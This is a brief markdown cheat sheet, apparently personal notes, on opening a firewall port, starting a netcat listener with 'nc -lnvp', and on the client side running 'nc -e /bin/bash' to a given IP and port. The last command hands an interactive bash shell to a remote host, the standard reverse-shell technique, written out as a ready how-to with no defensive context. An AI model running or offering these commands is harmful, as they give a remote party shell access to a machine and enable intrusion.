## Checking ip adress
```
ifconfig
```
## Finding a open port

```
sudo netstat -tunpl
```

## Creating a open port
```
sudo ufw allow [port-number]
```

## Server side command:

```
nc -lnvp "port" -s "ip"
```


## Client side command:

```
nc -e /bin/bash "ip" "port"
```
